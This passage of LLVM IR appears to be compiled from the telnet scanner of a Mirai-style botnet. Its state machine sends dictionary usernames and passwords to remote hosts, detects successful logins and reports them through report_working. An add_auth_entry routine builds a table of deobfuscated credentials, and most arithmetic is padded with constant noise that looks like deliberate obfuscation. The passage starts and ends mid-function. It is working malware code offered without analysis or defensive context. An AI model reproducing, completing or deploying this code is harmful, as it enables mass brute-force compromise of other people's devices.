  %757 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %756, i32 0, i32 7
  %758 = getelementptr inbounds [256 x i8], [256 x i8]* %757, i32 0, i32 0
  %759 = getelementptr inbounds i8, i8* %758, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %755, i8* %759, i64 192, i32 1, i1 false)
  %760 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %761 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %760, i32 0, i32 6
  %762 = load i32, i32* %761, align 4
  %763 = sub i32 %762, 2102165107
  %764 = sub i32 %763, 64
  %765 = add i32 %764, 2102165107
  %766 = sub nsw i32 %762, 64
  store i32 %765, i32* %761, align 4
  br label %767

; <label>:767:                                    ; preds = %752, %747
  %768 = call i32* @__errno_location() #7
  store i32 0, i32* %768, align 4
  %769 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %770 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %769, i32 0, i32 1
  %771 = load i32, i32* %770, align 8
  %772 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %773 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %772, i32 0, i32 7
  %774 = getelementptr inbounds [256 x i8], [256 x i8]* %773, i32 0, i32 0
  %775 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %776 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %775, i32 0, i32 6
  %777 = load i32, i32* %776, align 4
  %778 = sext i32 %777 to i64
  %779 = getelementptr inbounds i8, i8* %774, i64 %778
  %780 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %781 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %780, i32 0, i32 6
  %782 = load i32, i32* %781, align 4
  %783 = sub i32 0, %782
  %784 = add i32 256, %783
  %785 = sub nsw i32 256, %782
  %786 = call i32 @recv_strip_null(i32 %771, i8* %779, i32 %784, i32 16384)
  store i32 %786, i32* %32, align 4
  %787 = load i32, i32* %32, align 4
  %788 = icmp eq i32 %787, 0
  br i1 %788, label %789, label %791

; <label>:789:                                    ; preds = %767
  %790 = call i32* @__errno_location() #7
  store i32 104, i32* %790, align 4
  store i32 -1, i32* %32, align 4
  br label %791

; <label>:791:                                    ; preds = %789, %767
  %792 = load i32, i32* %32, align 4
  %793 = icmp eq i32 %792, -1
  br i1 %793, label %794, label %827

; <label>:794:                                    ; preds = %791
  %795 = call i32* @__errno_location() #7
  %796 = load i32, i32* %795, align 4
  %797 = icmp ne i32 %796, 11
  br i1 %797, label %798, label %826

; <label>:798:                                    ; preds = %794
  %799 = call i32* @__errno_location() #7
  %800 = load i32, i32* %799, align 4
  %801 = icmp ne i32 %800, 11
  br i1 %801, label %802, label %826

; <label>:802:                                    ; preds = %798
  %803 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %804 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %803, i32 0, i32 1
  %805 = load i32, i32* %804, align 8
  %806 = call i32 @close(i32 %805)
  %807 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %808 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %807, i32 0, i32 1
  store i32 -1, i32* %808, align 8
  %809 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %810 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %809, i32 0, i32 8
  %811 = load i8, i8* %810, align 8
  %812 = add i8 %811, 67
  %813 = add i8 %812, 1
  %814 = sub i8 %813, 67
  %815 = add i8 %811, 1
  store i8 %814, i8* %810, align 8
  %816 = zext i8 %814 to i32
  %817 = icmp sge i32 %816, 10
  br i1 %817, label %818, label %823

; <label>:818:                                    ; preds = %802
  %819 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %820 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %819, i32 0, i32 8
  store i8 0, i8* %820, align 8
  %821 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %822 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %821, i32 0, i32 3
  store i32 0, i32* %822, align 8
  br label %825

; <label>:823:                                    ; preds = %802
  %824 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %824)
  br label %825

; <label>:825:                                    ; preds = %823, %818
  br label %826

; <label>:826:                                    ; preds = %825, %798, %794
  br label %1096

; <label>:827:                                    ; preds = %791
  %828 = load i32, i32* %32, align 4
  %829 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %830 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %829, i32 0, i32 6
  %831 = load i32, i32* %830, align 4
  %832 = sub i32 %831, -2120153153
  %833 = add i32 %832, %828
  %834 = add i32 %833, -2120153153
  %835 = add nsw i32 %831, %828
  store i32 %834, i32* %830, align 4
  %836 = load i32, i32* @fake_time, align 4
  %837 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %838 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %837, i32 0, i32 2
  store i32 %836, i32* %838, align 4
  br label %839

; <label>:839:                                    ; preds = %1094, %827
  store i32 0, i32* %33, align 4
  %840 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %841 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %840, i32 0, i32 3
  %842 = load i32, i32* %841, align 8
  switch i32 %842, label %1058 [
    i32 2, label %843
    i32 3, label %851
    i32 4, label %878
    i32 5, label %905
    i32 6, label %925
    i32 7, label %945
    i32 8, label %965
    i32 9, label %985
    i32 10, label %1005
  ]

; <label>:843:                                    ; preds = %839
  %844 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %845 = call i32 @consume_iacs(%struct.scanner_connection* %844)
  store i32 %845, i32* %33, align 4
  %846 = icmp sgt i32 %845, 0
  br i1 %846, label %847, label %850

; <label>:847:                                    ; preds = %843
  %848 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %849 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %848, i32 0, i32 3
  store i32 3, i32* %849, align 8
  br label %850

; <label>:850:                                    ; preds = %847, %843
  br label %1059

; <label>:851:                                    ; preds = %839
  %852 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %853 = call i32 @consume_user_prompt(%struct.scanner_connection* %852)
  store i32 %853, i32* %33, align 4
  %854 = icmp sgt i32 %853, 0
  br i1 %854, label %855, label %877

; <label>:855:                                    ; preds = %851
  %856 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %857 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %856, i32 0, i32 1
  %858 = load i32, i32* %857, align 8
  %859 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %860 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %859, i32 0, i32 0
  %861 = load %struct.scanner_auth*, %struct.scanner_auth** %860, align 8
  %862 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %861, i32 0, i32 0
  %863 = load i8*, i8** %862, align 8
  %864 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %865 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %864, i32 0, i32 0
  %866 = load %struct.scanner_auth*, %struct.scanner_auth** %865, align 8
  %867 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %866, i32 0, i32 4
  %868 = load i8, i8* %867, align 4
  %869 = zext i8 %868 to i64
  %870 = call i64 @send(i32 %858, i8* %863, i64 %869, i32 16384)
  %871 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %872 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %871, i32 0, i32 1
  %873 = load i32, i32* %872, align 8
  %874 = call i64 @send(i32 %873, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  %875 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %876 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %875, i32 0, i32 3
  store i32 4, i32* %876, align 8
  br label %877

; <label>:877:                                    ; preds = %855, %851
  br label %1059

; <label>:878:                                    ; preds = %839
  %879 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %880 = call i32 @consume_pass_prompt(%struct.scanner_connection* %879)
  store i32 %880, i32* %33, align 4
  %881 = icmp sgt i32 %880, 0
  br i1 %881, label %882, label %904

; <label>:882:                                    ; preds = %878
  %883 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %884 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %883, i32 0, i32 1
  %885 = load i32, i32* %884, align 8
  %886 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %887 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %886, i32 0, i32 0
  %888 = load %struct.scanner_auth*, %struct.scanner_auth** %887, align 8
  %889 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %888, i32 0, i32 1
  %890 = load i8*, i8** %889, align 8
  %891 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %892 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %891, i32 0, i32 0
  %893 = load %struct.scanner_auth*, %struct.scanner_auth** %892, align 8
  %894 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %893, i32 0, i32 5
  %895 = load i8, i8* %894, align 1
  %896 = zext i8 %895 to i64
  %897 = call i64 @send(i32 %885, i8* %890, i64 %896, i32 16384)
  %898 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %899 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %898, i32 0, i32 1
  %900 = load i32, i32* %899, align 8
  %901 = call i64 @send(i32 %900, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  %902 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %903 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %902, i32 0, i32 3
  store i32 5, i32* %903, align 8
  br label %904

; <label>:904:                                    ; preds = %882, %878
  br label %1059

; <label>:905:                                    ; preds = %839
  %906 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %907 = call i32 @consume_any_prompt(%struct.scanner_connection* %906)
  store i32 %907, i32* %33, align 4
  %908 = icmp sgt i32 %907, 0
  br i1 %908, label %909, label %924

; <label>:909:                                    ; preds = %905
  call void @table_unlock_val(i8 zeroext 5)
  %910 = call i8* @table_retrieve_val(i32 5, i32* %35)
  store i8* %910, i8** %34, align 8
  %911 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %912 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %911, i32 0, i32 1
  %913 = load i32, i32* %912, align 8
  %914 = load i8*, i8** %34, align 8
  %915 = load i32, i32* %35, align 4
  %916 = sext i32 %915 to i64
  %917 = call i64 @send(i32 %913, i8* %914, i64 %916, i32 16384)
  %918 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %919 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %918, i32 0, i32 1
  %920 = load i32, i32* %919, align 8
  %921 = call i64 @send(i32 %920, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 5)
  %922 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %923 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %922, i32 0, i32 3
  store i32 6, i32* %923, align 8
  br label %924

; <label>:924:                                    ; preds = %909, %905
  br label %1059

; <label>:925:                                    ; preds = %839
  %926 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %927 = call i32 @consume_any_prompt(%struct.scanner_connection* %926)
  store i32 %927, i32* %33, align 4
  %928 = icmp sgt i32 %927, 0
  br i1 %928, label %929, label %944

; <label>:929:                                    ; preds = %925
  call void @table_unlock_val(i8 zeroext 6)
  %930 = call i8* @table_retrieve_val(i32 6, i32* %37)
  store i8* %930, i8** %36, align 8
  %931 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %932 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %931, i32 0, i32 1
  %933 = load i32, i32* %932, align 8
  %934 = load i8*, i8** %36, align 8
  %935 = load i32, i32* %37, align 4
  %936 = sext i32 %935 to i64
  %937 = call i64 @send(i32 %933, i8* %934, i64 %936, i32 16384)
  %938 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %939 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %938, i32 0, i32 1
  %940 = load i32, i32* %939, align 8
  %941 = call i64 @send(i32 %940, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 6)
  %942 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %943 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %942, i32 0, i32 3
  store i32 7, i32* %943, align 8
  br label %944

; <label>:944:                                    ; preds = %929, %925
  br label %1059

; <label>:945:                                    ; preds = %839
  %946 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %947 = call i32 @consume_any_prompt(%struct.scanner_connection* %946)
  store i32 %947, i32* %33, align 4
  %948 = icmp sgt i32 %947, 0
  br i1 %948, label %949, label %964

; <label>:949:                                    ; preds = %945
  call void @table_unlock_val(i8 zeroext 4)
  %950 = call i8* @table_retrieve_val(i32 4, i32* %39)
  store i8* %950, i8** %38, align 8
  %951 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %952 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %951, i32 0, i32 1
  %953 = load i32, i32* %952, align 8
  %954 = load i8*, i8** %38, align 8
  %955 = load i32, i32* %39, align 4
  %956 = sext i32 %955 to i64
  %957 = call i64 @send(i32 %953, i8* %954, i64 %956, i32 16384)
  %958 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %959 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %958, i32 0, i32 1
  %960 = load i32, i32* %959, align 8
  %961 = call i64 @send(i32 %960, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 4)
  %962 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %963 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %962, i32 0, i32 3
  store i32 8, i32* %963, align 8
  br label %964

; <label>:964:                                    ; preds = %949, %945
  br label %1059

; <label>:965:                                    ; preds = %839
  %966 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %967 = call i32 @consume_any_prompt(%struct.scanner_connection* %966)
  store i32 %967, i32* %33, align 4
  %968 = icmp sgt i32 %967, 0
  br i1 %968, label %969, label %984

; <label>:969:                                    ; preds = %965
  call void @table_unlock_val(i8 zeroext 7)
  %970 = call i8* @table_retrieve_val(i32 7, i32* %41)
  store i8* %970, i8** %40, align 8
  %971 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %972 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %971, i32 0, i32 1
  %973 = load i32, i32* %972, align 8
  %974 = load i8*, i8** %40, align 8
  %975 = load i32, i32* %41, align 4
  %976 = sext i32 %975 to i64
  %977 = call i64 @send(i32 %973, i8* %974, i64 %976, i32 16384)
  %978 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %979 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %978, i32 0, i32 1
  %980 = load i32, i32* %979, align 8
  %981 = call i64 @send(i32 %980, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 7)
  %982 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %983 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %982, i32 0, i32 3
  store i32 9, i32* %983, align 8
  br label %984

; <label>:984:                                    ; preds = %969, %965
  br label %1059

; <label>:985:                                    ; preds = %839
  %986 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %987 = call i32 @consume_any_prompt(%struct.scanner_connection* %986)
  store i32 %987, i32* %33, align 4
  %988 = icmp sgt i32 %987, 0
  br i1 %988, label %989, label %1004

; <label>:989:                                    ; preds = %985
  call void @table_unlock_val(i8 zeroext 8)
  %990 = call i8* @table_retrieve_val(i32 8, i32* %43)
  store i8* %990, i8** %42, align 8
  %991 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %992 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %991, i32 0, i32 1
  %993 = load i32, i32* %992, align 8
  %994 = load i8*, i8** %42, align 8
  %995 = load i32, i32* %43, align 4
  %996 = sext i32 %995 to i64
  %997 = call i64 @send(i32 %993, i8* %994, i64 %996, i32 16384)
  %998 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %999 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %998, i32 0, i32 1
  %1000 = load i32, i32* %999, align 8
  %1001 = call i64 @send(i32 %1000, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 8)
  %1002 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1003 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1002, i32 0, i32 3
  store i32 10, i32* %1003, align 8
  br label %1004

; <label>:1004:                                   ; preds = %989, %985
  br label %1059

; <label>:1005:                                   ; preds = %839
  %1006 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1007 = call i32 @consume_resp_prompt(%struct.scanner_connection* %1006)
  store i32 %1007, i32* %33, align 4
  %1008 = load i32, i32* %33, align 4
  %1009 = icmp eq i32 %1008, -1
  br i1 %1009, label %1010, label %1035

; <label>:1010:                                   ; preds = %1005
  %1011 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1012 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1011, i32 0, i32 1
  %1013 = load i32, i32* %1012, align 8
  %1014 = call i32 @close(i32 %1013)
  %1015 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1016 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1015, i32 0, i32 1
  store i32 -1, i32* %1016, align 8
  %1017 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1018 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1017, i32 0, i32 8
  %1019 = load i8, i8* %1018, align 8
  %1020 = sub i8 0, %1019
  %1021 = sub i8 0, 1
  %1022 = add i8 %1020, %1021
  %1023 = sub i8 0, %1022
  %1024 = add i8 %1019, 1
  store i8 %1023, i8* %1018, align 8
  %1025 = zext i8 %1023 to i32
  %1026 = icmp eq i32 %1025, 10
  br i1 %1026, label %1027, label %1032

; <label>:1027:                                   ; preds = %1010
  %1028 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1029 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1028, i32 0, i32 8
  store i8 0, i8* %1029, align 8
  %1030 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1031 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1030, i32 0, i32 3
  store i32 0, i32* %1031, align 8
  br label %1034

; <label>:1032:                                   ; preds = %1010
  %1033 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %1033)
  br label %1034

; <label>:1034:                                   ; preds = %1032, %1027
  br label %1057

; <label>:1035:                                   ; preds = %1005
  %1036 = load i32, i32* %33, align 4
  %1037 = icmp sgt i32 %1036, 0
  br i1 %1037, label %1038, label %1056

; <label>:1038:                                   ; preds = %1035
  %1039 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1040 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1039, i32 0, i32 4
  %1041 = load i32, i32* %1040, align 4
  %1042 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1043 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1042, i32 0, i32 5
  %1044 = load i16, i16* %1043, align 8
  %1045 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1046 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1045, i32 0, i32 0
  %1047 = load %struct.scanner_auth*, %struct.scanner_auth** %1046, align 8
  call void @report_working(i32 %1041, i16 zeroext %1044, %struct.scanner_auth* %1047)
  %1048 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1049 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1048, i32 0, i32 1
  %1050 = load i32, i32* %1049, align 8
  %1051 = call i32 @close(i32 %1050)
  %1052 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1053 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1052, i32 0, i32 1
  store i32 -1, i32* %1053, align 8
  %1054 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1055 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1054, i32 0, i32 3
  store i32 0, i32* %1055, align 8
  br label %1056

; <label>:1056:                                   ; preds = %1038, %1035
  br label %1057

; <label>:1057:                                   ; preds = %1056, %1034
  br label %1059

; <label>:1058:                                   ; preds = %839
  store i32 0, i32* %33, align 4
  br label %1059

; <label>:1059:                                   ; preds = %1058, %1057, %1004, %984, %964, %944, %924, %904, %877, %850
  %1060 = load i32, i32* %33, align 4
  %1061 = icmp eq i32 %1060, 0
  br i1 %1061, label %1062, label %1063

; <label>:1062:                                   ; preds = %1059
  br label %1095

; <label>:1063:                                   ; preds = %1059
  %1064 = load i32, i32* %33, align 4
  %1065 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1066 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1065, i32 0, i32 6
  %1067 = load i32, i32* %1066, align 4
  %1068 = icmp sgt i32 %1064, %1067
  br i1 %1068, label %1069, label %1073

; <label>:1069:                                   ; preds = %1063
  %1070 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1071 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1070, i32 0, i32 6
  %1072 = load i32, i32* %1071, align 4
  store i32 %1072, i32* %33, align 4
  br label %1073

; <label>:1073:                                   ; preds = %1069, %1063
  %1074 = load i32, i32* %33, align 4
  %1075 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1076 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1075, i32 0, i32 6
  %1077 = load i32, i32* %1076, align 4
  %1078 = sub i32 0, %1074
  %1079 = add i32 %1077, %1078
  %1080 = sub nsw i32 %1077, %1074
  store i32 %1079, i32* %1076, align 4
  %1081 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1082 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1081, i32 0, i32 7
  %1083 = getelementptr inbounds [256 x i8], [256 x i8]* %1082, i32 0, i32 0
  %1084 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1085 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1084, i32 0, i32 7
  %1086 = getelementptr inbounds [256 x i8], [256 x i8]* %1085, i32 0, i32 0
  %1087 = load i32, i32* %33, align 4
  %1088 = sext i32 %1087 to i64
  %1089 = getelementptr inbounds i8, i8* %1086, i64 %1088
  %1090 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1091 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1090, i32 0, i32 6
  %1092 = load i32, i32* %1091, align 4
  %1093 = sext i32 %1092 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1083, i8* %1089, i64 %1093, i32 1, i1 false)
  br label %1094

; <label>:1094:                                   ; preds = %1073
  br label %839

; <label>:1095:                                   ; preds = %1062
  br label %741

; <label>:1096:                                   ; preds = %826, %746
  br label %1097

; <label>:1097:                                   ; preds = %1096, %716
  br label %1098

; <label>:1098:                                   ; preds = %1097, %704, %660
  %1099 = load i32, i32* %1, align 4
  %1100 = sub i32 %1099, 434549032
  %1101 = add i32 %1100, 1
  %1102 = add i32 %1101, 434549032
  %1103 = add nsw i32 %1099, 1
  store i32 %1102, i32* %1, align 4
  br label %648

; <label>:1104:                                   ; preds = %648
  br label %221
}

declare void @rand_init() #4

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) #2

; Function Attrs: noinline nounwind uwtable
define internal void @add_auth_entry(i8*, i8*, i16 zeroext) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i16 %2, i16* %6, align 2
  %8 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %9 = bitcast %struct.scanner_auth* %8 to i8*
  %10 = load i32, i32* @auth_table_len, align 4
  %11 = sub i32 0, %10
  %12 = sub i32 0, 1
  %13 = add i32 %11, %12
  %14 = sub i32 0, %13
  %15 = add nsw i32 %10, 1
  %16 = sext i32 %14 to i64
  %17 = mul i64 %16, 24
  %18 = call i8* @realloc(i8* %9, i64 %17) #6
  %19 = bitcast i8* %18 to %struct.scanner_auth*
  store %struct.scanner_auth* %19, %struct.scanner_auth** @auth_table, align 8
  %20 = load i8*, i8** %4, align 8
  %21 = call i8* @deobf(i8* %20, i32* %7)
  %22 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %23 = load i32, i32* @auth_table_len, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %22, i64 %24
  %26 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %25, i32 0, i32 0
  store i8* %21, i8** %26, align 8
  %27 = load i32, i32* %7, align 4
  %28 = trunc i32 %27 to i8
  %29 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %30 = load i32, i32* @auth_table_len, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %29, i64 %31
  %33 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %32, i32 0, i32 4
  store i8 %28, i8* %33, align 4
  %34 = load i8*, i8** %5, align 8
  %35 = call i8* @deobf(i8* %34, i32* %7)
  %36 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %37 = load i32, i32* @auth_table_len, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %36, i64 %38
  %40 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %39, i32 0, i32 1
  store i8* %35, i8** %40, align 8
  %41 = load i32, i32* %7, align 4
  %42 = trunc i32 %41 to i8
  %43 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %44 = load i32, i32* @auth_table_len, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %43, i64 %45
  %47 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %46, i32 0, i32 5
  store i8 %42, i8* %47, align 1
  %48 = load i16, i16* @auth_table_max_weight, align 2
  %49 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %50 = load i32, i32* @auth_table_len, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %49, i64 %51
  %53 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %52, i32 0, i32 2
  store i16 %48, i16* %53, align 8
  %54 = load i16, i16* @auth_table_max_weight, align 2
  %55 = zext i16 %54 to i32
  %56 = load i16, i16* %6, align 2
  %57 = zext i16 %56 to i32
  %58 = sub i32 0, %55
  %59 = sub i32 0, %57
  %60 = add i32 %58, %59
  %61 = sub i32 0, %60
  %62 = add nsw i32 %55, %57
  %63 = trunc i32 %61 to i16
  %64 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %65 = load i32, i32* @auth_table_len, align 4
  %66 = sub i32 %65, -243208389
  %67 = add i32 %66, 1
  %68 = add i32 %67, -243208389
  %69 = add nsw i32 %65, 1
  store i32 %68, i32* @auth_table_len, align 4
  %70 = sext i32 %65 to i64
  %71 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %64, i64 %70
  %72 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %71, i32 0, i32 3
  store i16 %63, i16* %72, align 2
  %73 = load i16, i16* %6, align 2
  %74 = zext i16 %73 to i32
  %75 = load i16, i16* @auth_table_max_weight, align 2
  %76 = zext i16 %75 to i32
  %77 = add i32 %76, -1133366688
  %78 = add i32 %77, %74
  %79 = sub i32 %78, -1133366688
  %80 = add nsw i32 %76, %74
  %81 = trunc i32 %79 to i16
  store i16 %81, i16* @auth_table_max_weight, align 2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_random_ip() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8, align 1
  %3 = alloca i8, align 1
  %4 = alloca i8, align 1
